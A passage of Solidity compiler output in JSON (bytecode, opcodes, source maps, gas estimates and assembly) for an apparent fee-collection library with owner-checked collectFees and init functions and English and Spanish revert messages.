							"opcodes": "PUSH2 0x40B PUSH2 0x26 PUSH1 0xB DUP3 DUP3 DUP3 CODECOPY DUP1 MLOAD PUSH1 0x0 BYTE PUSH1 0x73 EQ PUSH2 0x19 JUMPI INVALID JUMPDEST ADDRESS PUSH1 0x0 MSTORE PUSH1 0x73 DUP2 MSTORE8 DUP3 DUP2 RETURN INVALID PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x40 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xA033FCD4 EQ PUSH2 0x45 JUMPI DUP1 PUSH4 0xF09A4016 EQ PUSH2 0xA0 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 DUP1 ISZERO PUSH2 0x51 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x9E PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x68 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x111 JUMP JUMPDEST STOP JUMPDEST DUP2 DUP1 ISZERO PUSH2 0xAC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x10F PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0xC3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x315 JUMP JUMPDEST STOP JUMPDEST DUP2 DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x1B3 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1F DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x596F7520617265206E6F742074686520636F6E7472616374206F776E65722100 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP3 GT PUSH2 0x229 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x11 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x4E6F206665657320636F6C6C6563746564000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP3 SWAP1 POP PUSH1 0x0 SWAP3 POP PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH1 0x40 MLOAD DUP1 PUSH1 0x0 ADD SWAP1 POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x292 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x297 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x30E JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x13 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x4661696C656420746F2073656E64206665657300000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x39A JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x34 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x3A2 PUSH1 0x34 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP POP JUMP INVALID GASLIMIT PUSH13 0x206F776E657220796120686120 PUSH20 0x69646F206D6F646966696361646F2079206E6F20 PUSH17 0x756564652063616D6269617273652EA264 PUSH10 0x706673582212203DBB21 PUSH2 0xA3A0 0xAF CREATE 0xBA EXP SWAP8 BYTE CREATE2 RETURN SELFBALANCE SMOD 0x2B PUSH30 0x24A87855AD12210F904C5107A51B64736F6C634300060400330000000000 ",
							"sourceMap": "4489:2426:0:-:0;;132:2:-1;166:7;155:9;146:7;137:37;255:7;249:14;246:1;241:23;235:4;232:33;222:2;;269:9;222:2;293:9;290:1;283:20;323:4;314:7;306:22;347:7;338;331:24"
						},
						"deployedBytecode": {
							"linkReferences": {},
							"object": "73000000000000000000000000000000000000000030146080604052600436106100405760003560e01c8063a033fcd414610045578063f09a4016146100a0575b600080fd5b81801561005157600080fd5b5061009e6004803603604081101561006857600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919080359060200190929190505050610111565b005b8180156100ac57600080fd5b5061010f600480360360408110156100c357600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff169060200190929190803573ffffffffffffffffffffffffffffffffffffffff169060200190929190505050610315565b005b818073ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146101b3576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040180806020018281038252601f8152602001807f596f7520617265206e6f742074686520636f6e7472616374206f776e6572210081525060200191505060405180910390fd5b60008211610229576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260118152602001807f4e6f206665657320636f6c6c656374656400000000000000000000000000000081525060200191505060405180910390fd5b60008290506000925060008473ffffffffffffffffffffffffffffffffffffffff168260405180600001905060006040518083038185875af1925050503d8060008114610292576040519150601f19603f3d011682016040523d82523d6000602084013e610297565b606091505b505090508061030e576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260138152602001807f4661696c656420746f2073656e6420666565730000000000000000000000000081525060200191505060405180910390fd5b5050505050565b600073ffffffffffffffffffffffffffffffffffffffff168273ffffffffffffffffffffffffffffffffffffffff161461039a576040517f08c379a00000000000000000000000000000000000000000000000000000000081526004018080602001828103825260348152602001806103a26034913960400191505060405180910390fd5b809150505056fe456c206f776e6572207961206861207369646f206d6f646966696361646f2079206e6f2070756564652063616d6269617273652ea26469706673582212203dbb2161a3a0aff0ba0a971af5f347072b7d24a87855ad12210f904c5107a51b64736f6c63430006040033",
							"opcodes": "PUSH20 0x0 ADDRESS EQ PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x40 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0xA033FCD4 EQ PUSH2 0x45 JUMPI DUP1 PUSH4 0xF09A4016 EQ PUSH2 0xA0 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 DUP1 ISZERO PUSH2 0x51 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x9E PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0x68 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x111 JUMP JUMPDEST STOP JUMPDEST DUP2 DUP1 ISZERO PUSH2 0xAC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x10F PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x40 DUP2 LT ISZERO PUSH2 0xC3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x315 JUMP JUMPDEST STOP JUMPDEST DUP2 DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x1B3 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x1F DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x596F7520617265206E6F742074686520636F6E7472616374206F776E65722100 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP3 GT PUSH2 0x229 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x11 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x4E6F206665657320636F6C6C6563746564000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP3 SWAP1 POP PUSH1 0x0 SWAP3 POP PUSH1 0x0 DUP5 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH1 0x40 MLOAD DUP1 PUSH1 0x0 ADD SWAP1 POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP8 GAS CALL SWAP3 POP POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x292 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x297 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP SWAP1 POP DUP1 PUSH2 0x30E JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x13 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x4661696C656420746F2073656E64206665657300000000000000000000000000 DUP2 MSTORE POP PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP3 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND EQ PUSH2 0x39A JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x34 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH2 0x3A2 PUSH1 0x34 SWAP2 CODECOPY PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST DUP1 SWAP2 POP POP POP JUMP INVALID GASLIMIT PUSH13 0x206F776E657220796120686120 PUSH20 0x69646F206D6F646966696361646F2079206E6F20 PUSH17 0x756564652063616D6269617273652EA264 PUSH10 0x706673582212203DBB21 PUSH2 0xA3A0 0xAF CREATE 0xBA EXP SWAP8 BYTE CREATE2 RETURN SELFBALANCE SMOD 0x2B PUSH30 0x24A87855AD12210F904C5107A51B64736F6C634300060400330000000000 ",
							"sourceMap": "4489:2426:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;12:1:-1;9;2:12;5893:326:0;;5:9:-1;2:2;;;27:1;24;17:12;2:2;5893:326:0;;;;;;15:2:-1;10:3;7:11;4:2;;;31:1;28;21:12;4:2;5893:326:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;5411:259;;5:9:-1;2:2;;;27:1;24;17:12;2:2;5411:259:0;;;;;;15:2:-1;10:3;7:11;4:2;;;31:1;28;21:12;4:2;5411:259:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;5893:326;5973:12;5128;5114:26;;:10;:26;;;5106:69;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;6021:1:::1;6007:11;:15;5998:46;;;;;;;;;;;;;;;;;;;;;;;;;;;::::0;::::1;;;;;;;;;;;;;6055:9;6067:11;6055:23;;6102:1;6089:14;;6115:9;6130:12;:17;;6155:4;6130:34;;;;;;;;;;;;;;;;;;;;;;;12:1:-1;19;14:27;;;;67:4;61:11;56:16;;134:4;130:9;123:4;105:16;101:27;97:43;94:1;90:51;84:4;77:65;157:16;154:1;147:27;211:16;208:1;201:4;198:1;194:12;179:49;5:228;;14:27;32:4;27:9;;5:228;;6114:50:0;;;6183:4;6175:36;;;;;;;;;;;;;;;;;;;;;;;;;;;::::0;::::1;;;;;;;;;;;;;5186:1;;5893:326:::0;;;:::o;5411:259::-;5512:1;5488:26;;:12;:26;;;5480:91;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;5656:6;5641:21;;5411:259;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "207000",
								"executionCost": "276",
								"totalCost": "207276"
							},
							"external": {
								"collectFees(address,uint256)": "infinite",
								"init(address,address)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 4489,
									"end": 6915,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 4489,
									"end": 6915,
									"name": "PUSH [$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 132,
									"end": 134,
									"name": "PUSH",
									"source": -1,
									"value": "B"
								},
								{
									"begin": 166,
									"end": 173,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 155,
									"end": 164,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 146,
									"end": 153,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 137,
									"end": 174,
									"name": "CODECOPY",
									"source": -1
								},
								{
									"begin": 255,
									"end": 262,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 249,
									"end": 263,
									"name": "MLOAD",
									"source": -1
								},
								{
									"begin": 246,
									"end": 247,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 241,
									"end": 264,
									"name": "BYTE",
									"source": -1
								},
								{
									"begin": 235,
									"end": 239,
									"name": "PUSH",
									"source": -1,
									"value": "73"
								},
								{
									"begin": 232,
									"end": 265,
									"name": "EQ",
									"source": -1
								},
								{
									"begin": 222,
									"end": 224,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 269,
									"end": 278,
									"name": "INVALID",
									"source": -1
								},
								{
									"begin": 222,
									"end": 224,
									"name": "tag",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 222,
									"end": 224,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 293,
									"end": 302,
									"name": "ADDRESS",
									"source": -1
								},
								{
									"begin": 290,
									"end": 291,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 283,
									"end": 303,
									"name": "MSTORE",
									"source": -1
								},
								{
									"begin": 323,
									"end": 327,
									"name": "PUSH",
									"source": -1,
									"value": "73"
								},
								{
									"begin": 314,
									"end": 321,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 306,
									"end": 328,
									"name": "MSTORE8",
									"source": -1
								},
								{
									"begin": 347,
									"end": 354,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 338,
									"end": 345,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 331,
									"end": 355,
									"name": "RETURN",
									"source": -1
								}
							],
							".data": {
								"0": {
									".auxdata": "a26469706673582212203dbb2161a3a0aff0ba0a971af5f347072b7d24a87855ad12210f904c5107a51b64736f6c63430006040033",
									".code": [
										{
											"begin": 4489,
											"end": 6915,
											"name": "PUSHDEPLOYADDRESS",
											"source": 0
										},
										{
											"begin": 4489,
											"end": 6915,
											"name": "ADDRESS",
											"source": 0
										},
										{
											"begin": 4489,
											"end": 6915,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 4489,
											"end": 6915,
											"name": "PUSH",
											"source": 0,
											"value": "80"
										},
										{
											"begin": 4489,
											"end": 6915,
											"name": "PUSH",
											"source": 0,
											"value": "40"
										},
										{
											"begin": 4489,
											"end": 6915,
											"name": "MSTORE",
											"source": 0
										},
										{
											"begin": 4489,
											"end": 6915,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 4489,
											"end": 6915,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 4489,
											"end": 6915,
											"name": "LT",
											"source": 0
										},
										{
											"begin": 4489,
											"end": 6915,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 4489,
											"end": 6915,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 4489,
											"end": 6915,
											"name": "PUSH",
											"source": 0,
											"value": "0"
										},
										{
											"begin": 4489,
											"end": 6915,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 4489,
											"end": 6915,
											"name": "PUSH",
											"source": 0,
											"value": "E0"
										},
										{
											"begin": 4489,
											"end": 6915,
											"name": "SHR",
											"source": 0
										},
										{
											"begin": 4489,
											"end": 6915,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 4489,
											"end": 6915,
											"name": "PUSH",
											"source": 0,
											"value": "A033FCD4"
										},
										{
											"begin": 4489,
											"end": 6915,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 4489,
											"end": 6915,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 4489,
											"end": 6915,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 4489,
											"end": 6915,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 4489,
											"end": 6915,
											"name": "PUSH",
											"source": 0,
											"value": "F09A4016"
										},
										{
											"begin": 4489,
											"end": 6915,
											"name": "EQ",
											"source": 0
										},
										{
											"begin": 4489,
											"end": 6915,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 4489,
											"end": 6915,
											"name": "JUMPI",
											"source": 0
										},
										{
											"begin": 4489,
											"end": 6915,
											"name": "tag",
											"source": 0,
											"value": "1"
										},
										{
											"begin": 4489,
											"end": 6915,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 12,
											"end": 13,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 9,
											"end": 10,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 14,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "tag",
											"source": 0,
											"value": "2"
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "4"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "4"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 15,
											"end": 17,
											"name": "PUSH",
											"source": -1,
											"value": "40"
										},
										{
											"begin": 10,
											"end": 13,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 7,
											"end": 18,
											"name": "LT",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "6"
										},
										{
											"begin": 4,
											"end": 6,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 31,
											"end": 32,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 28,
											"end": 29,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 21,
											"end": 33,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 4,
											"end": 6,
											"name": "tag",
											"source": -1,
											"value": "6"
										},
										{
											"begin": 4,
											"end": 6,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "PUSH",
											"source": 0,
											"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "AND",
											"source": 0
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "CALLDATALOAD",
											"source": 0
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "PUSH",
											"source": 0,
											"value": "20"
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "ADD",
											"source": 0
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "SWAP3",
											"source": 0
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "SWAP2",
											"source": 0
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "SWAP1",
											"source": 0
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "7"
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "JUMP",
											"source": 0,
											"value": "[in]"
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "tag",
											"source": 0,
											"value": "5"
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5893,
											"end": 6219,
											"name": "STOP",
											"source": 0
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "tag",
											"source": 0,
											"value": "3"
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "JUMPDEST",
											"source": 0
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "DUP2",
											"source": 0
										},
										{
											"begin": 5,
											"end": 14,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"source": -1,
											"value": "8"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI",
											"source": -1
										},
										{
											"begin": 27,
											"end": 28,
											"name": "PUSH",
											"source": -1,
											"value": "0"
										},
										{
											"begin": 24,
											"end": 25,
											"name": "DUP1",
											"source": -1
										},
										{
											"begin": 17,
											"end": 29,
											"name": "REVERT",
											"source": -1
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"source": -1,
											"value": "8"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST",
											"source": -1
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "POP",
											"source": 0
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "PUSH [tag]",
											"source": 0,
											"value": "9"
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "PUSH",
											"source": 0,
											"value": "4"
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "DUP1",
											"source": 0
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "CALLDATASIZE",
											"source": 0
										},
										{
											"begin": 5411,
											"end": 5670,
											"name": "SUB",
											"source": 0
										},
										{
											"begin": 15,
											"end": 17,
											"name": "PUSH",
											"source": -1,
											"value": "40"
										},
										{
											"begin": 10,
											"end": 13,
											"name": "DUP2",
											"source": -1
										},
										{
											"begin": 7,
											"end": 18,
											"name": "LT",
